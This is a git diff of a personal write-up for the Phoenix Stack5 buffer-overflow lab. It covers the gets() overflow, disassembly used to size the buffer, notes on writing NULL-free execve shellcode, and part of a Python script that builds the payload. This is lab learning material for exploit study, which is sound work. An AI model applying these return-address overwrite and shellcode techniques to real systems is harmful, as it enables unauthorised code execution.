@@ -1,6 +1,7 @@
 # Phoenix Stack5
 ### Result
-### Learning
+< not completed, as yet >
+### Overview
 This challenge started with a question:
 
 > As opposed to executing an existing function in the binary, this time we’ll be introducing the concept of “shell code”, and being able to execute our own code.
@@ -8,6 +9,11 @@ This challenge started with a question:
 You had to overwrite the `return address` and jump to self-written / downloaded `shellcode`.
 
 Overwriting the `return address` and running `shellcode` was simpler on `stack5.c`, compared to a modern compiled C program.  It was not protected with `ASLR`, `Stack Guards` and it had an `executable stack`.
+### Great references
+This challenge was a big jump in effort and time, compared to Stack4. Two great resources helped me get over issues:
+
+https://www.coengoedegebure.com/buffer-overflow-attacks-explained/
+https://www.lucas-bader.com/ctf/2019/02/02/stack5
 
 The `Buffer Overflow` was possible due to the code using the vulnerable C API `gets()`.
 
@@ -26,7 +32,7 @@ AAA
 002 0x00000378 0x00010378 GLOBAL   FUNC   16 imp.gets
 003 0x00000384 0x00010384 GLOBAL   FUNC   16 imp.puts
 ```
-### Calculate buffer to overflow
+##### Calculate buffer to overflow
 ```
 / (fcn) sym.start_level 36
 |           0x000104f0      80d04de2       sub sp, sp, 0x80   <-- space for local var
@@ -100,11 +106,23 @@ $ cat ~/128chars | wc -c
 cat ~/128chars | ./stack-five
 Illegal instruction
 ```
-##### Write / find shellcode
+##### Shellcode
 I practiced writing my own shellcode:
 https://github.com/rustymagnet3000/bits_bytes_playground/blob/master/example_28b_C_execve_shellcode.md
 
-##### Construct Payload
+This was a learning exercise to write assembly code and then re-factor the asm code to remove NULL bytes.  
+
+Ultimately you were able to run:
+
+```
+~$ ./tiny
+// spawned a new shell here
+$ whoami
+user
+$ exit
+// back in original shell
+```
+##### Script to construct Payload
 ```
 #!/usr/bin/env python
 
@@ -128,16 +146,16 @@ if __name__ == "__main__":
         sys.stdout.write("\\x" + byte.encode("hex"))
     print ""
 ```
-##### Construct Payload
-```
-python payload.py > payload
-```
-On my ARM-emulating terminal it did not.I kept hitting:
+On my ARM-emulator using `print` did not work with encoding.  I kept hitting:
 
 `UnicodeEncodeError: 'ascii' codec can't encode characters in position 0-59`
 
 That is why I moved to using `byte.encode`.
 
+##### Construct Payload
+```
+python payload.py > payload
+```
 ##### The Payload
 ```
 $ cat payload
